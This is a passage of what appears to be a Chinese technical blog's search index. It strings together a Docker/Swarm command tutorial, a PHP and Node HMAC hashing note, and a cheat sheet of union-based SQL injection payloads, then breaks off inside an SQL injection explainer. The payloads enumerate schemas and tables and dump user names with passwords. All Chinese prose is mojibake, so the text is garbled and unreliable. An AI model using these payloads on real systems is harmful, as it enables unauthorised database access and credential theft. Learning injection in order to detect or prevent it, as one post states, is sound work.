åœ¨é›†ç¾¤ä¸­éƒ¨ç½²åº”ç”¨ç¨‹åºåœ¨å¼€å§‹éƒ¨ç½²ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£åˆ°æœ‰ä¸¤ç§æ–¹å¼å¯ä»¥å®ç°ã€‚ docker-machine ä¸ºSwarm ç®¡ç†å™¨é…ç½®Shell åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬ä¸ VM é€šä¿¡éƒ½æ˜¯é€šè¿‡ docker-machine sshè¿™ç§æ–¹å¼ï¼Œå¦ä¸€ç§æ›´å¥½çš„æ–¹å¼å°±æ˜¯ï¼šå°†å½“å‰shellé…ç½®ä¸ºä¸VMä¸Šçš„Dockerå®ˆæŠ¤ç¨‹åºé€šä¿¡ã€‚ è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æœ¬åœ°çš„docker-compose.ymlæ–‡ä»¶è¿œç¨‹éƒ¨ç½²åº”ç”¨ç¨‹åºï¼Œè€Œæ— éœ€å°†å…¶å¤åˆ¶åˆ°å…¶ä»–ä»»ä½•ä½ç½®ã€‚ 12345678910$ docker-machine env myvm1export DOCKER_TLS_VERIFY&#x3D;&quot;1&quot;export DOCKER_HOST&#x3D;&quot;tcp:&#x2F;&#x2F;192.168.99.100:2376&quot;export DOCKER_CERT_PATH&#x3D;&quot;&#x2F;Users&#x2F;sam&#x2F;.docker&#x2F;machine&#x2F;machines&#x2F;myvm1&quot;export DOCKER_MACHINE_NAME&#x3D;&quot;myvm1&quot;# Run this command to configure your shell:# eval $(docker-machine env myvm1)# è¿è¡Œæœ€åä¸€è¡Œå‘½ä»¤ä»¥é…ç½®ä¸ä¹‹é€šä¿¡çš„ shell $ eval $(docker-machine env myvm1) # eval $(sudodocker-machine env myvm1) è¿è¡Œdocker-machine ls å·²éªŒè¯ myvm1 ç°åœ¨æ˜¯æ´»åŠ¨çš„è®¡ç®—æœºã€‚å¸¦æœ‰æ˜Ÿå·ï¼ˆ*ï¼‰è¡¨ç¤ºé…ç½®æˆåŠŸ 1234$ docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 * virtualbox Running tcp:&#x2F;&#x2F;192.168.99.100:2376 v17.06.2-cemyvm2 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.101:2376 v17.06.2-ce éƒ¨ç½²åº”ç”¨ç¨‹åº 123$ lsdocker-compose.yml$ docker stack deploy -c docker-compose.yml getstartedlab ä¼ ç»Ÿæ–¹å¼ ä¼ ç»Ÿçš„æ–¹å¼å°±æ˜¯å°†docker-compose.ymlæ–‡ä»¶æ‹·è´åˆ°å¯¹åº”çš„ç®¡ç†å™¨ä¸­ã€‚ 1234# ä½¿ç”¨scp å‘½ä»¤å°†æ–‡ä»¶æ‹·è´åˆ° vm å®ä¾‹ä¸­$ lsdocker-compose.yml$ docker-machine scp docker-compose.yml myvm1:~ éƒ¨ç½²åº”ç”¨ç¨‹åº 12345678# è¿™é‡Œå°±å¯ä»¥éšæ„é€‰æ‹©ä½¿ç”¨ä¹‹å‰ä»‹ç»çš„æ–¹å¼ä¸€æˆ–è€…æ–¹å¼äºŒ# æ–¹å¼ä¸€$ docker-machine ssh myvm1 &quot;docker stack deploy -c docker-compose.yml getstartedlab&quot;# æ–¹å¼äºŒ$ docker-machine ssh myvm1docker@myvm1: $ docker stack deploy -c docker-compose.yml è€å¿ƒç­‰å¾…ä¸€ä¼šï¼Œå°±å¯ä»¥çœ‹åˆ°çœ‹åˆ°éƒ¨ç½²æˆåŠŸäº†ã€‚ è®¿é—®é›†ç¾¤åœ¨è®¿é—®é›†ç¾¤ä¹‹å‰ï¼Œä½ éœ€è¦çŸ¥é“ä»¥ä¸‹ä¸¤ä»¶äº‹ï¼š è®¿é—®é›†ç¾¤çš„IP åœ°å€æ˜¯VM çš„IPï¼Œä½¿ç”¨docker-machine lsæŸ¥çœ‹ æ˜¯å¦å­˜åœ¨ç«¯å£å·ï¼Œå–å†³äºä½ çš„docker-compose.ymlæ–‡ä»¶ Docker å¸¸ç”¨å‘½ä»¤å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸåˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡Œï¼š 123456789$ docker run [OPTIONS] IMAGE [COMMAND] [ARG...]$ docker run ubuntu:15.10 &#x2F;bin&#x2F;echo &quot;Hello world&quot;# è§£é‡Šï¼šDockerä»¥ubuntu15.10é•œåƒåˆ›å»ºä¸€ä¸ªæ–°å®¹å™¨ï¼Œç„¶ååœ¨å®¹å™¨é‡Œæ‰§è¡Œ bin&#x2F;echo &quot;Hello world&quot;ï¼Œæœ€åè¾“å‡ºç»“æœã€‚å‚æ•°* -dï¼šè®©å®¹å™¨åœ¨åå°è¿è¡Œ* -pï¼šå†…éƒ¨å®¹å™¨ç»‘å®šåˆ°æŒ‡å®šçš„ä¸»æœºç«¯å£ä¸Š* -Pï¼šå†…éƒ¨å®¹å™¨ç«¯å£éšæœºæ˜ å°„åˆ°ä¸»æœºç«¯å£ä¸Š* --nameï¼šç»™å®¹å™¨å‘½åï¼Œå¦‚æœä¸åŠ --name å‚æ•°ï¼ŒDocker ä¼šè‡ªåŠ¨å‘½åã€‚ æ€æ‰ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ï¼š 12$ docker kill -s KILL mydocker# mydocker è¡¨ç¤ºContianer IDæˆ–è€…Name ç»“æŸåœæ­¢ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ï¼š 12$ docker container stop mydocker# mydocker è¡¨ç¤ºContainer IDæˆ–è€…Name æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼š 123456$ docker pså‚æ•°* -lï¼šæŸ¥è¯¢æœ€åä¸€æ¬¡åˆ›å»ºå®¹å™¨è®°å½•* --allï¼šæŸ¥è¯¢æ‰€æœ‰åˆ›å»ºå®¹å™¨è®°å½•* -aqï¼šæŸ¥è¯¢æ‰€æœ‰åˆ›å»ºå®¹å™¨çš„Container ID åœæ­¢Web åº”ç”¨å®¹å™¨ è¿™ä¸ªåªæ˜¯åœæ­¢è¯¥å®¹å™¨çš„è¿è¡Œï¼Œå¹¶æ²¡æœ‰æ€æ­» 1$ docker stop mydocker å¯åŠ¨Web åº”ç”¨å®¹å™¨ å·²ç»åœæ­¢çš„å®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ docker start æ¥å¯åŠ¨ã€‚ 1$ docker start mydocker ç§»é™¤Web åº”ç”¨å®¹å™¨ 123$ docker rm mydockermydocker# åˆ é™¤å®¹å™¨æ—¶ï¼Œå®¹å™¨å¿…é¡»æ˜¯åœæ­¢çŠ¶æ€ï¼Œå¦è€…ä¼šæŠ¥é”™ã€‚ é•œåƒæ“ä½œå¦‚ä½•åˆ›å»ºä¸€ä¸ªDocker é•œåƒ 1$ docker build --tag&#x3D;mydockerapp # æ³¨æ„ï¼šæ ‡ç­¾ååªèƒ½å°å†™ åˆ—å‡ºä¸‹è½½åˆ°è®¡ç®—æœºä¸­çš„é•œåƒ 12345678910$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest fce289e99eb9 3 months ago 1.84kBå„ä¸ªé€‰é¡¹è¯´æ˜:* REPOSITORYï¼šè¡¨ç¤ºé•œåƒçš„ä»“åº“æº* TAGï¼šé•œåƒçš„æ ‡ç­¾* IMAGE IDï¼šé•œåƒID* CREATEDï¼šé•œåƒåˆ›å»ºæ—¶é—´* SIZEï¼šé•œåƒå¤§å° æŸ¥æ‰¾é•œåƒ 123456789$ docker search nginx NAME DESCRIPTION STARS OFFICIAL nginx Official build of Nginx. 11154 [OK]NAME:é•œåƒä»“åº“æºçš„åç§°DESCRIPTION:é•œåƒçš„æè¿°OFFICIAL:æ˜¯å¦dockerå®˜æ–¹å‘å¸ƒ è·å–ä¸€ä¸ªæ–°é•œåƒ å¦‚æœæˆ‘ä»¬å†³å®šä½¿ç”¨ä¸Šå›¾ä¸­çš„ nginx å®˜æ–¹é•œåƒï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1$ docker pull nginx å®¹å™¨æ“ä½œåˆ—å‡ºä¸‹è½½åˆ°è®¡ç®—æœºä¸­çš„ container 12$ docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ä»“åº“æ“ä½œç™»å…¥hub.docker.com 12$ docker login # å‰ææ˜¯å…ˆæ³¨å†Œå·è´¦å· æ ‡è®°é•œåƒï¼Œä»¥ä¾¿ä¸Šä¼ è‡³ç›®æ ‡ä½ç½® 12$ docker tag mydocker aikang&#x2F;get-started:part1# æœ€åä¸Šä¼ è‡³æ‰€ç™»å…¥çš„Docker Hubä»“åº“ å°†æ ‡è®°çš„é•œåƒä¸Šä¼ åˆ°å­˜å‚¨åº“ï¼š 1$ docker push mydocker aikang&#x2F;get-started:part1 ä»è¿œç¨‹å­˜å‚¨åº“ä¸­æ‹‰å‡ºå¹¶è¿è¡Œæ˜ åƒ 1$ docker run -d -p 4000:80 aikang&#x2F;get-started:part1 æ³¨æ„ï¼šæ— è®ºåœ¨å“ªé‡Œæ‰§è¡Œdocker runï¼Œå®ƒéƒ½ä¼šæå–ä½ çš„é•œåƒï¼Œä»¥åŠPythonå’Œæ‰€æœ‰ä¾èµ–é¡¹requirements.txtï¼Œå¹¶è¿è¡Œä½ çš„ä»£ç ã€‚å®ƒä»¬éƒ½åœ¨ä¸€ä¸ªæ•´æ´çš„å°åŒ…ä¸­ä¸€èµ·æ—…è¡Œï¼Œä½ ä¸éœ€è¦åœ¨ä¸»æœºä¸Šå®‰è£…ä»»ä½•ä¸œè¥¿è®©Dockerè¿è¡Œå®ƒã€‚ æœåŠ¡æ“ä½œç¾¤é›†åˆå§‹åŒ–ï¼Œå¯ä»¥ä½¿èŠ‚ç‚¹å˜æˆç¾¤é›†ç®¡ç†å™¨ 1$ docker swarm init ä»¥æœåŠ¡è¿è¡Œ 1234$ docker stack deploy -c docker-compose.yml getstartedlabCreating network getstartedlab_webnetCreating service getstartedlab_web# éœ€è¦æœ‰ä¸€ä¸ªdocker-compose.yml æ–‡ä»¶ åˆ—å‡ºä¸åº”ç”¨ç¨‹åºå…³è”çš„æ­£åœ¨è¿è¡Œçš„æœåŠ¡ 1$ docker service ls æŸ¥çœ‹ä¸å †æ ˆç›¸å…³çš„æ‰€æœ‰æœåŠ¡ 12$ docker stack services getstartedlab# getstartedlab è¡¨ç¤ºæœåŠ¡çš„Names åˆ—å‡ºæœåŠ¡ä»»åŠ¡ 12$ docker service ps getstartedlab# getstartedlab è¡¨ç¤ºæœåŠ¡çš„Names å…³é—­æœåŠ¡ 12$ docker stack rm getstartedlab# getstartedlab è¡¨ç¤ºæœåŠ¡çš„Names æŸ¥çœ‹é›†ç¾¤ä¸­çš„èŠ‚ç‚¹ 1$ docker node ls VM äº¤äº’åˆ›å»ºä¸€ä¸ªVM å®ä¾‹ï¼ˆWinã€Macã€Linuxï¼‰ 1$ docker-machine create --driver virtualbox myvm1 ä½¿ç”¨ssh è¿æ¥VM å®ä¾‹ 1$ docker-machine ssh myvm1 æŸ¥çœ‹å…³äºèŠ‚ç‚¹çš„åŸºæœ¬ä¿¡æ¯ 1$ docker-machine env myvm1 ä½¿ç”¨scpå‘½ä»¤å°†æœ¬åœ°æ–‡ä»¶copyåˆ°VMå®ä¾‹ä¸­ 12$ docker-machine scp &lt;filename&gt; myvm1:~ # ä»å½“å‰ç›®å½•æ‹·è´åˆ°å®ä¾‹ä¸­çš„æ ¹ç›®å½•ä¸‹ åˆ é™¤æŒ‡å®šVM 1$ docker-machine rm myvm1 å°†Shell ä¸VM è¿æ¥ 1$ eval $(docker-machine env myvm1) å°†Shell ä¸VM æ–­å¼€ï¼Œä½¿ç”¨æœ¬åœ°è¿æ¥ 1$ eval $(docker-machine env -u) é›†ç¾¤æ“ä½œä»¥ä¸‹æ“ä½œå‡éœ€è¦åœ¨VM CLI ä¸­è¿è¡Œ åˆå§‹åŒ–é›†ç¾¤ 1$ docker swarm init --advertise-addr &lt;myvm1 ip&gt; å°†èŠ‚ç‚¹åŠ å…¥é›†ç¾¤ 1$ docker swarm join --token &lt;token&gt; &lt;ip&gt;:2377&quot; è®©å·¥ä½œè€…ç¦»å¼€é›†ç¾¤ 1$ docker swarm leave å¼ºåˆ¶ç¦»å¼€å¹¶å…³æ‰é›†ç¾¤ 1$ docker swarm leave -f æŸ¥çœ‹è¯¥èŠ‚ç‚¹çš„è¯¦æƒ…ä¿¡æ¯ 1$ docker node inspect &lt;node ID&gt; éƒ¨ç½²åº”ç”¨ç¨‹åº 1$ docker stack deploy -c &lt;file&gt; &lt;app&gt; æ‚é¡¹æŸ¥çœ‹Dockerç‰ˆæœ¬ï¼š 1$ docker version æ˜¾ç¤ºDockerç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬é•œåƒå’Œå®¹å™¨æ•°ï¼š 1$ docker info æŸ¥çœ‹Docker å®¹å™¨çš„é…ç½®å’ŒçŠ¶æ€ä¿¡æ¯ã€‚ 12$ docker inspect mydocker# è¡¨ç¤ºå®¹å™¨çš„Container ID æˆ–è€…Names æŸ¥çœ‹æŒ‡å®šå®¹å™¨æ˜ å°„åˆ°å®¿ä¸»æœºçš„ç«¯å£å·ã€‚ 123$ docker port mydocker80&#x2F;tcp -&gt; 0.0.0.0:4000# mydocker è¡¨ç¤ºè¯¥åº”ç”¨çš„Container ID æˆ–è€…Names æŸ¥çœ‹Web åº”ç”¨ç¨‹åºæ—¥å¿— 12345$ docker logs -f mydocker * Running on http:&#x2F;&#x2F;0.0.0.0:80&#x2F; (Press CTRL+C to quit)113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:34] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:35] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -# mydocker è¡¨ç¤ºè¯¥åº”ç”¨çš„Container ID æˆ–è€…æ˜¯Names æŸ¥çœ‹Web åº”ç”¨ç¨‹åºå®¹å™¨çš„è¿›ç¨‹ 1234$ docker top mydocker # UID PID PPID C STIME TTY TIME CMDroot 22358 22323 0 20:58 ? 00:00:00 python app.py æ‚é¡¹å®¹å™¨æœ‰å“ªäº›ç½‘ç»œæ¨¡å¼1. Noneåœ¨è¯¥æ¨¡å¼ä¸‹å®¹å™¨æ²¡æœ‰å¯¹å¤–ç½‘ç»œï¼Œæœ¬åœ°æœºåªæœ‰ä¸€ä¸ªå›è·¯åœ°å€ 2. Containeråœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œä¸å¦ä¸€ä¸ªå®¹å™¨å…±äº«ç½‘ç»œ 3. Hoståœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œä¸ä¸»æœºå…±äº«ç½‘ç»œ 4. Bridgeè¯¥æ¨¡å¼ä¸ºDocker é»˜è®¤çš„ç½‘ç»œæ¨¡å¼ï¼Œåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒDocker å®¹å™¨ä¸å¤–éƒ¨çš„é€šä¿¡éƒ½æ˜¯é€šè¿‡ iptable å®ç°çš„ã€‚ 5. Overlayè¯¥æ¨¡å¼ä¸ºDocker ç›®å‰åŸç”Ÿçš„è·¨ä¸»æœºå¤šå­ç½‘æ¨¡å‹ï¼Œä¸»è¦æ˜¯é€šè¿‡ vxlan æŠ€æœ¯å®ç°ã€‚ å‚è€ƒé“¾æ¥ Docker å…¥é—¨æ•™ç¨‹ - é˜®ä¸€å³°ç½‘ç»œæ—¥å¿— Docker å…¥é—¨ - æå®¢å­¦é™¢ å®‰è£…Docker ce - å®˜æ–¹æ–‡æ¡£ Docker Swarm å…¥é—¨æ•™ç¨‹ å¦‚ä½•åœ¨Ubuntu 18.4ä¸Šå®‰è£… Docker-ce å¦‚ä½•åœ¨Ubuntu 18.04ä¸Šå®‰è£…Docker Machine å¦‚ä½•åœ¨Ubuntu 18.04ä¸Šå®‰è£…VirtualBox","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"PHP ä¸­ä½¿ç”¨ hash_hmac åŠ å¯†","slug":"php-uses-hash-hmac-encryption","date":"2020-07-22T16:18:45.000Z","updated":"2020-11-12T01:26:42.165Z","comments":true,"path":"php-uses-hash-hmac-encryption/","link":"","permalink":"https://www.0x2beace.com/php-uses-hash-hmac-encryption/","excerpt":"ä»Šå¤©åšé¡¹ç›®æ—¶ï¼Œé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œéœ€è¦å°†ä¸€æ®µå“ˆå¸Œå€¼æŒ‰ç…§æŸç§è§„åˆ™è¿›è¡ŒåŠ å¯†ã€‚æºç æ˜¯ç”¨Nodeå†™çš„ï¼Œéœ€è¦ç¿»è¯‘æˆPHP ç‰ˆæœ¬çš„ã€‚","text":"ä»Šå¤©åšé¡¹ç›®æ—¶ï¼Œé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œéœ€è¦å°†ä¸€æ®µå“ˆå¸Œå€¼æŒ‰ç…§æŸç§è§„åˆ™è¿›è¡ŒåŠ å¯†ã€‚æºç æ˜¯ç”¨Nodeå†™çš„ï¼Œéœ€è¦ç¿»è¯‘æˆPHP ç‰ˆæœ¬çš„ã€‚ PHPä¸­ä½¿ç”¨ Hmac æ–¹æ³•ç”Ÿæˆå¸¦æœ‰å¯†é’¥çš„å“ˆå¸Œå€¼åœ¨Node.js ä¸­ï¼Œè¿™æ˜¯ä¸€æ®µç”¨äºç”Ÿæˆâ€œåŠ ç›â€çš„å“ˆå¸Œå€¼ã€‚ 12345678var crypto &#x3D; require(&#39;crypto&#39;);var secret &#x3D; &quot;122410&quot;var key &#x3D; &quot;key&quot;var hash &#x3D; crypto.createHmac(&#39;sha256&#39;, secret).update(key).digest(&#39;hex&#39;)console.log(hash);&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4 å¦‚æœè¦ç¿»è¯‘æˆPHPç‰ˆæœ¬ï¼Œå…¶å®éå¸¸ç®€å•ï¼Œç›´æ¥ä½¿ç”¨PHP çš„ hash_hmacå‡½æ•°å°±å¯ä»¥äº†ã€‚ 12345&lt;?php$secret &#x3D; &quot;122410&quot;; $key &#x3D; &quot;key&quot;;echo hash_hmac(&quot;sha256&quot;, $key, $secret);&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4 å°†å¯†é’¥è®¾ç½®æˆäºŒè¿›åˆ¶å¦‚æœéœ€è¦åŠ å¯†çš„éƒ¨åˆ†ï¼Œå¹¶ä¸æ˜¯æ™®é€šçš„å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆéœ€è¦ä½¿ç”¨packå‡½æ•°ã€‚ 1234var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;));&#x2F;&#x2F; 5e50e6458b0cdc7ee534967d113a9deffe6740d0&#x2F;&#x2F; é¢„æœŸç»“æœï¼š46abe81345b1da2f1a330bba3d6254e110cd9ad8 å…ˆå°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°æ®ï¼Œç„¶åå†å°†å…¶ä¼ é€’ç»™hash_hmacï¼š 123var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, pack(&quot;H*&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;)));&#x2F;&#x2F; 46abe81345b1da2f1a330bba3d6254e110cd9ad8 Nodeä¸­ä½¿ç”¨cryptoè¿›è¡Œmd5 åŠ å¯†åœ¨PHP ä¸­ï¼Œå¦‚æœéœ€è¦è·å–æŸä¸ªå­—ç¬¦ä¸²çš„md5 åŠ å¯†ä¹‹åçš„å“ˆå¸Œå€¼ï¼Œéå¸¸ç®€å•ï¼Œç›´æ¥ä½¿ç”¨md5 å‡½æ•°å³å¯ã€‚ ä½†æ˜¯åœ¨node.js ä¸­ï¼Œå¹¶æ²¡æœ‰ä¸ºæˆ‘ä»¬ç›´æ¥æä¾›è¿™æ ·çš„å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨è°ƒç”¨crypto æ¨¡å—å»è½¬æ¢ï¼š 1234var pwd &#x3D; &quot;122410&quot;;var hash &#x3D; crypto.createHash(&#39;md5&#39;).update(pwd).digest(&#39;hex&#39;);&#x2F;&#x2F; 913975c2f972ba6bbf5ba593c68a5dc5 å‚è€ƒé“¾æ¥ å¦‚ä½•åœ¨PHPä¸­å°†hmac sha1å¯†é’¥è®¾ç½®ä¸ºåå…­è¿›åˆ¶ï¼Ÿ åœ¨çº¿è½¬æ¢å·¥å…· php hash_hmac å‡½æ•° node.js crypto æ¨¡å—","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"Hash","slug":"Hash","permalink":"https://www.0x2beace.com/tags/Hash/"}]},{"title":"æ•´ç†å¸¸è§çš„ SQL æ³¨å…¥è¯­å¥","slug":"organize-common-sql-injection-statements","date":"2020-07-22T15:30:04.000Z","updated":"2020-07-22T15:31:27.367Z","comments":true,"path":"organize-common-sql-injection-statements/","link":"","permalink":"https://www.0x2beace.com/organize-common-sql-injection-statements/","excerpt":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯æ•´ç†å„ç§ SQL æ³¨å…¥ä½¿ç”¨æ—¶çš„payloadã€‚","text":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯æ•´ç†å„ç§ SQL æ³¨å…¥ä½¿ç”¨æ—¶çš„payloadã€‚ è¯´æ˜ï¼šä»¥ä¸‹çš„payloadséƒ½åŸºäºå•å¼•å·å­—ç¬¦å‹æ³¨å…¥ã€‚è‹¥æ˜¯æ•´å‹æ³¨å…¥åˆ™æŠŠå•å¼•å·å’Œæ³¨é‡Šç¬¦ï¼ˆâ€“+ï¼‰å»æ‰ï¼Œè‹¥æ˜¯åŒå¼•å·æ³¨å…¥åˆ™æŠŠå•å¼•å·æ¢æˆåŒå¼•å·ã€‚ ä¹Ÿå°±æ˜¯åŸºäºè¿™æ ·ä¸€ç§æƒ…å†µï¼š 1SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;; Payload åˆ¤æ–­å½“å‰æ•°æ®è¡¨ä¸­æœ‰å‡ åˆ—ï¼š 1?id&#x3D;1&#39; order by æ•°å€¼ --+ æŸ¥çœ‹æ˜¾ç¤ºä½åœ¨ç¬¬å‡ åˆ—ï¼š 1?id&#x3D;-1&#39; union select 1,2,3 --+ æ³¨æ„ï¼šè¿™é‡Œéœ€è¦ä¼ é€’ä¸€ä¸ªä¸å­˜åœ¨çš„æ¡ä»¶ï¼Œæ¯”å¦‚ï¼šid=-1 æ˜¾ç¤ºå½“å‰æ•°æ®åº“ï¼ˆå‡è®¾æ˜¾ç¤ºä½ä¸­åŒ…å«ç¬¬ä¸‰ä½ï¼‰ï¼š 1?id&#x3D;-1&#39; union select 1,2,database() --+ æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ï¼š 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+ å‡½æ•°group_concat()æŠŠæ‰€æœ‰ç»“æœéƒ½åœ¨ä¸€è¡Œè¾“å‡º æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“ï¼š 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+ æŸ¥è¯¢æŸä¸ªæ•°æ®åº“ä¸­çš„è¡¨ï¼š 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+ æŸ¥è¯¢æŸä¸ªè¡¨ä¸­çš„æ‰€æœ‰å­—æ®µï¼š 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+ æŸ¥è¯¢æŸä¸ªè¡¨ä¸­çš„å­—æ®µå†…å®¹ 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users) 0x3aä¼šè¢«è½¬ä¹‰ä½å†’å·ï¼š UnionSQL UNION æ“ä½œç¬¦åˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šUNION å†…éƒ¨çš„æ¯ä¸ª SELECT è¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒæ•°é‡çš„åˆ—ã€‚ å‚è€ƒé“¾æ¥Webå®‰å…¨å­¦ä¹ ä¹‹æ•°æ®åº“æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹ ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Web å®‰å…¨","slug":"Web-å®‰å…¨","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"}]},{"title":"è®¤è¯†SQL æ³¨å…¥å¸¸è§æ–¹å¼","slug":"know-common-ways-of-sql-injection","date":"2020-07-22T15:26:11.000Z","updated":"2020-07-22T15:29:48.375Z","comments":true,"path":"know-common-ways-of-sql-injection/","link":"","permalink":"https://www.0x2beace.com/know-common-ways-of-sql-injection/","excerpt":"æœ€è¿‘éœ€è¦åšä¸€ä¸ªæ£€æµ‹SQL æ³¨å…¥çš„åŠŸèƒ½ï¼Œæ— å¥ˆå‘ç°è‡ªå·±äºå¯¹SQL æ³¨å…¥ç«Ÿæœ‰ç‚¹é™Œç”Ÿï¼Œæœ¬ç€ææ¸…æ¥šåŸç†æ‰èƒ½æ›´å¥½çš„ç†è§£Bug äº§ç”Ÿçš„åŸå› ï¼Œäºæ˜¯ä¾¿æœ‰äº†è¿™ç¯‡ç¬”è®°ã€‚","text":"æœ€è¿‘éœ€è¦åšä¸€ä¸ªæ£€æµ‹SQL æ³¨å…¥çš„åŠŸèƒ½ï¼Œæ— å¥ˆå‘ç°è‡ªå·±äºå¯¹SQL æ³¨å…¥ç«Ÿæœ‰ç‚¹é™Œç”Ÿï¼Œæœ¬ç€ææ¸…æ¥šåŸç†æ‰èƒ½æ›´å¥½çš„ç†è§£Bug äº§ç”Ÿçš„åŸå› ï¼Œäºæ˜¯ä¾¿æœ‰äº†è¿™ç¯‡ç¬”è®°ã€‚ SQL æ³¨å…¥æ˜¯ä»€ä¹ˆï¼ŸSQL æ³¨å…¥æ˜¯ä¸€ç§å°†SQL è¯­å¥æ·»åŠ åˆ°REQUEST å‚æ•°ä¸­ï¼Œä¼ é€’åˆ°æœåŠ¡å™¨å¹¶æ‰§è¡Œçš„ä¸€ç§æ”»å‡»æ‰‹æ®µã€‚ SQL æ³¨å…¥æ”»å‡»æ˜¯REQUEST å¼•æ•¸æœªç»è¿‡è¿‡æ»¤ï¼Œç„¶åç›´æ¥æ‹¼æ¥åˆ°SQL è¯­å¥ä¸­ï¼Œè§£æå¹¶æ‰§è¡Œï¼Œè€Œè¾¾åˆ°é¢„æƒ³ä¹‹å¤–çš„ä¸€ç§è¡Œä¸ºã€‚ SQL æ³¨å…¥æ˜¯æ€æ ·äº§ç”Ÿçš„ WEB å¼€å‘äººå‘˜æ— æ³•ä¿è¯æ‰€æœ‰çš„è¾“å…¥éƒ½å·²ç»å®Œç¾è¿‡æ»¤ã€‚ æ•°æ®åº“æœªåšå®‰å…¨é…ç½®ï¼Œå­˜åœ¨å®‰å…¨éšæ‚£ã€‚ å¦‚ä½•è¿›è¡ŒSQL æ³¨å…¥è¿™é‡Œä»¥PHPã€Mysqlä¸ºä¾‹ï¼Œä»‹ç»ä¸€ä¸‹å®Œæ•´çš„SQL æ³¨å…¥æ”»å‡»æ˜¯å¦‚ä½•äº§ç”Ÿçš„ã€‚ å›æ˜¾æ³¨å…¥1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php$db_host &#x3D; &quot;localhost&quot;;$db_user &#x3D; &quot;root&quot;;$db_pwd &#x3D; xxxxxx;$db_name &#x3D; &quot;User&quot;;$db_table &#x3D; &quot;Student&quot;;echo &#39;&lt;h1&gt;&#39;;echo &#39;Test ErrorBased Injections&#39;;echo &#39;&lt;&#x2F;h1&gt;&#39;;error_reporting(E_ALL ^ E_DEPRECATED);&#x2F;&#x2F; æµ‹è¯•è¿æ¥$conn &#x3D; mysqli_connect($db_host, $db_user, $db_pwd);if (!$conn)&#123; echo &#39;Mysql è¿æ¥å¤±è´¥:&#39;.mysqli_error($conn);&#125;else &#123; echo &#39;Mysql è¿æ¥æˆåŠŸ&#39;;&#125;echo 